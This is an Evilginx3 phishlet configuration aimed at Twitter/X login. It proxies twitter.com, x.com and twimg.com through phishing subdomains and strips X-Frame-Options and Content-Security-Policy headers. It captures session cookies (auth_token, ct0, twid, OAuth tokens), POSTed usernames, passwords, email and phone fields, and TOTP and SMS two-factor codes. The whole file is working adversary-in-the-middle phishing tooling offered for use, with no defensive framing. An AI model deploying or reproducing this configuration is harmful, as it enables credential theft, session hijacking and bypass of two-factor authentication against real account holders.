min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://twitter.com/'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'twitter.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'mobile', orig_sub: 'mobile', domain: 'twitter.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'x', orig_sub: 'x', domain: 'x.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'api-x', orig_sub: 'api', domain: 'x.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'pbs', orig_sub: 'pbs', domain: 'twimg.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Twitter domain URLs
  - {triggers_on: 'www.twitter.com', orig_sub: 'www', domain: 'twitter.com', search: 'https://www\\.twitter\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.twitter.com', orig_sub: 'api', domain: 'twitter.com', search: 'https://api\\.twitter\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.twitter.com', orig_sub: 'mobile', domain: 'twitter.com', search: 'https://mobile\\.twitter\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.twitter.com', orig_sub: 'x', domain: 'x.com', search: 'https://x\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.twitter.com', orig_sub: 'api-x', domain: 'x.com', search: 'https://api\\.x\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Replace Twitter CDN URLs
  - {triggers_on: 'www.twitter.com', orig_sub: 'abs', domain: 'twimg.com', search: 'https://abs\\.twimg\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.twitter.com', orig_sub: 'pbs', domain: 'twimg.com', search: 'https://pbs\\.twimg\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.twitter.com', orig_sub: 'abs', domain: 'twimg.com', search: 'https://[a-z0-9-]+\\.twimg\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'www.twitter.com', orig_sub: 'www', domain: 'twitter.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.twitter.com', orig_sub: 'www', domain: 'twitter.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.twitter.com', orig_sub: 'api', domain: 'twitter.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.twitter.com', orig_sub: 'x', domain: 'x.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.twitter.com', orig_sub: 'x', domain: 'x.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Twitter/X authentication cookies
  - domain: '.twitter.com'
    keys: ['auth_token', 'ct0', 'twid', 'kdt', 'guest_id', 'guest_id_ads', 'guest_id_marketing']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.twitter.com'
    keys: ['personalization_id', 'm5', 'gt', 'dnt', 'lang']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.twitter.com'
    keys: ['oauth_token', 'oauth_token_secret', 'oauth_verifier']
    type: 'cookie'
    optional: true
  
  # X.com cookies (same structure)
  - domain: '.x.com'
    keys: ['auth_token', 'ct0', 'twid', 'kdt', 'guest_id']
    type: 'cookie'

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email/phone field
  email:
    key: 'text'
    search: '(.*)'
    type: 'post'
  
  phone:
    key: 'text'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'verification_code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'sms_code'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/home'
  - '^/i/flow/login'
  - '^/compose/tweet'
  - '^/notifications'
  - '^/messages'
  - '^/settings'

login:
  domain: 'www.twitter.com'
  path: '/i/flow/login'

